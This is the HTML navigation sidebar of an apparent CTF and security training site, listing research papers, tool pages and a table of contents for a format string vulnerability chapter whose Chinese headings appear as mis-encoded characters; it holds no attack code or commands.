  <span class="md-ellipsis">
    Docker for beginners
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Research
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Research
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
        
          
          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Artificial Intelligence
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_1">
            <span class="md-nav__icon md-icon"></span>
            Artificial Intelligence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cert-RNN: Towards Certifying the Robustness of Recurrent Neural Networks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Unleashing the Tiger Inference Attacks on Split Learning
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cryptography
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            Cryptography
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/Cryptography/Fuzzy%20Message%20Detection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Fuzzy Message Detection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
        
          
          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Internet of Things
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_3">
            <span class="md-nav__icon md-icon"></span>
            Internet of Things
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_4" >
        
          
          <label class="md-nav__link" for="__nav_5_4" id="__nav_5_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Misc
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_4">
            <span class="md-nav__icon md-icon"></span>
            Misc
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chaff Bugs: Deterring Attackers by Making Software Buggier
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_5" >
        
          
          <label class="md-nav__link" for="__nav_5_5" id="__nav_5_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Mobile
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_5">
            <span class="md-nav__icon md-icon"></span>
            Mobile
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Consistency Analysis of Data-Usage Purposes in Mobile Apps
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_6" >
        
          
          <label class="md-nav__link" for="__nav_5_6" id="__nav_5_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PWN
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_6">
            <span class="md-nav__icon md-icon"></span>
            PWN
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Exorcising Spectres with Secure Compilers
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_7" >
        
          
          <label class="md-nav__link" for="__nav_5_7" id="__nav_5_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Reverse Engineering
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_7">
            <span class="md-nav__icon md-icon"></span>
            Reverse Engineering
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Tool Collection
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Tool Collection
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1" >
        
          
          <label class="md-nav__link" for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Toolkit
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_1">
            <span class="md-nav__icon md-icon"></span>
            Toolkit
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Windows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows10 Penetration Suite Toolkit within Kali Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Kali/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kali Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/BlackArch/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Black Arch Linux
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2" >
        
          
          <label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Android
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_2">
            <span class="md-nav__icon md-icon"></span>
            Android
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Android/APKTool/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    APKTool
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Android/dex2jar/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dex2jar
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Android/LDPlayer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LDPlayer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Android/jadx/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    jadx
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3" >
        
          
          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    AWD
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_3">
            <span class="md-nav__icon md-icon"></span>
            AWD
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/AWD/AoiAWD/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AoiAWD
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/AWD/Auto-AWD/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Auto-AWD
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/AWD/AWD_auto_attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWD_auto_attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/AWD/awd-submit-flag/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    awd-submit-flag
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/AWD/awd-watchbird/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    awd-watchbird
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/AWD/flower/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    flower
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/AWD/ShellCat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ShellCat
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4" >
        
          
          <label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cryptography
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_4">
            <span class="md-nav__icon md-icon"></span>
            Cryptography
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Cryptography/SageMathCell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SageMathCell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Cryptography/RSAWiener/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RSA Wiener Attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Cryptography/hashcat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HashCat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Cryptography/Ciphey/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ciphey
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5" >
        
          
          <label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PWN
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_5">
            <span class="md-nav__icon md-icon"></span>
            PWN
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/PWN/PEiD/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PEiD
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/PWN/WinDbg/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WinDbg
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/PWN/WinHex/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WinHex: Computer Forensics &amp; Data Recovery Software, Hex Editor &amp; Disk Editor
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/PWN/x64dbg/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    x64dbg
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/PWN/Zeratool/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Zeratool
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6" >
        
          
          <label class="md-nav__link" for="__nav_6_6" id="__nav_6_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Reverse Engineering
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_6">
            <span class="md-nav__icon md-icon"></span>
            Reverse Engineering
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Reverse%20Engineering/IDA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IDA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Reverse%20Engineering/Bytecode%20Viewer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bytecode Viewer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Reverse%20Engineering/DiE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Detect it Easy (DiE)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Reverse%20Engineering/ExeInfoPE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ExeInfoPE
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_7" >
        
          
          <label class="md-nav__link" for="__nav_6_7" id="__nav_6_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Miscellaneous
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_7">
            <span class="md-nav__icon md-icon"></span>
            Miscellaneous
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Miscellaneous/bochs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bochs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Miscellaneous/qemu/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    qemu
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Miscellaneous/AZPR/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Advanced ZIP Password Recovery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Miscellaneous/Velato/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Velato
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_8" >
        
          
          <label class="md-nav__link" for="__nav_6_8" id="__nav_6_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Forensics
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_8">
            <span class="md-nav__icon md-icon"></span>
            Forensics
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/BlindWatermark/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blind Watermark
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/ProcessMonitor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Process Monitor
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/stegosaurus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    stegosaurus
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/Tracewrangler/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tracewrangler
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/Wireshark/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wireshark
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/volatility/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    volatility
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/zsteg/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    zsteg
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/exiftool/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ExifTool
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/foremost/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    foremost
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Tool/Forensics/stegsolve/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    stegsolve
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Training Schedule
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Training Schedule
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Varsity%20Competition%20Training%20Model/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Varsity Competition Training Model
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" checked>
        
          
          <label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Material
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_7_2">
            <span class="md-nav__icon md-icon"></span>
            Material
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Binary Exploitation
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Binary Exploitation
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#311" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.1 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°å’Œæ ¼å¼å­—ç¬¦ä¸²
    </span>
  </a>
  
    <nav class="md-nav" aria-label="æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°å’Œæ ¼å¼å­—ç¬¦ä¸²">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      å‡½æ•°
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      è½¬æ¢æŒ‡ç¤ºç¬¦
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      é•¿åº¦
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      ç¤ºä¾‹
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåŸºæœ¬åŽŸç†
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    <span class="md-ellipsis">
      æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨
    </span>
  </a>
  
    <nav class="md-nav" aria-label="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    <span class="md-ellipsis">
      ä½¿ç¨‹åºå´©æºƒ
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    <span class="md-ellipsis">
      æŸ¥çœ‹æ ˆå†…å®¹
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    <span class="md-ellipsis">
      æŸ¥çœ‹ä»»æ„åœ°å€çš„å†…å­˜
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    <span class="md-ellipsis">
      è¦†ç›–æ ˆå†…å®¹
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    <span class="md-ellipsis">
      è¦†ç›–ä»»æ„åœ°å€å†…å­˜
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#x86-64" class="md-nav__link">
    <span class="md-ellipsis">
      x86-64 ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ctf" class="md-nav__link">
    <span class="md-ellipsis">
      CTF ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž
    </span>
